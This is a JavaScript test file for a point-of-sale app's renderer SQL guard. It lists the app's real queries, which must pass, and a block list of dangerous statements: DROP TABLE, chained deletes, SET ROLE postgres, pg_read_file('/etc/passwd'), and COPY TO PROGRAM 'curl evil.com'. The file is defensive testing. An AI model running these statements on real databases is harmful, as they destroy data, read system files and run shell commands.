// Phase 0 hardening test: verify the renderer SQL guard allows every real app
// query and blocks DDL/admin/dangerous/chained statements.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const { validateRendererSql } = require('./sql-guard.js');

// Representative queries actually issued by pos/renderer/index.html.
const ALLOWED = [
  'SELECT brand_id FROM outlets WHERE id=?',
  `UPDATE tables_layout SET outlet_id=? WHERE outlet_id IS NULL`,
  'SELECT key,value FROM settings',
  'SELECT value FROM settings WHERE key=?',
  'INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)',
  'SELECT * FROM orders WHERE synced=0',
  'SELECT * FROM order_items WHERE order_id=?',
  'UPDATE orders SET synced=1 WHERE id=?',
  'INSERT OR IGNORE INTO categories (id,name) VALUES (?,?)',
  'INSERT OR REPLACE INTO menu_items (id,category_id,name,price,description,active,synced_at) VALUES (?,?,?,?,?,?,?)',
  `INSERT INTO order_items (id,order_id,item_id,item_name,category_name,quantity,unit_price,total_price,variant_name,modifiers,comp)
     VALUES (?,?,?,?,?,?,?,?,?,?,?)`,
  'SELECT * FROM cashiers WHERE pin=? AND active=1 LIMIT 1',
  `INSERT INTO shifts (id,cashier_id,cashier_name,opening_cash,status,terminal_id,opened_at) VALUES (?,?,?,?,?,?,?)`,
  "INSERT INTO orders (id,note) VALUES (?, 'table 5; window seat')",   // semicolon inside a string literal — must pass
  "SELECT * FROM orders WHERE note = 'a -- not a comment'",            // -- inside string — must pass
  'WITH t AS (SELECT id FROM orders WHERE synced=0) SELECT * FROM t',  // CTE — must pass
  `INSERT OR REPLACE INTO orders
     (id,order_number,total,synced) VALUES (?,?,?,?)`,                 // multi-line — must pass
];

// Things a buggy or compromised renderer must NOT be able to run.
const BLOCKED = [
  'DROP TABLE orders',
  'TRUNCATE orders',
  'ALTER TABLE orders ADD COLUMN x int',
  'CREATE TABLE evil (id int)',
  'GRANT ALL ON orders TO pos_central_user',
  'REVOKE ALL ON orders FROM pos_central_user',
  "COPY orders TO PROGRAM 'curl evil.com'",
  'SELECT 1; DROP TABLE orders',                 // chained
  'UPDATE orders SET total=0 WHERE id=1; DELETE FROM orders', // chained
  "SELECT pg_read_file('/etc/passwd')",
  "SELECT lo_export(1, '/tmp/x')",
  'SELECT pg_sleep(10)',
  "SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)",
  "DO $$ BEGIN PERFORM 1; END $$",
  'VACUUM FULL',
  'SET ROLE postgres',
  '',
  null,
  undefined,
  '   ',
  'SELECT 1 /* sneaky */; DROP TABLE orders',    // chained behind a comment
];

let pass = 0, fail = 0;
console.log('— ALLOWED (must return null) —');
for (const q of ALLOWED) {
  const r = validateRendererSql(q);
  if (r === null) { pass++; }
  else { fail++; console.log(`  ✗ FALSE POSITIVE: "${String(q).slice(0,60)}" → ${r}`); }
}
console.log(`  ${ALLOWED.length - 0} checked, ${fail === 0 ? 'all allowed ✓' : 'see failures above'}`);

console.log('— BLOCKED (must return a reason) —');
let blockedFails = 0;
for (const q of BLOCKED) {
  const r = validateRendererSql(q);
  if (r !== null) { pass++; }
  else { fail++; blockedFails++; console.log(`  ✗ NOT BLOCKED: "${String(q).slice(0,60)}"`); }
}
console.log(`  ${BLOCKED.length} checked, ${blockedFails === 0 ? 'all blocked ✓' : 'see failures above'}`);

console.log(`\nRESULT: ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
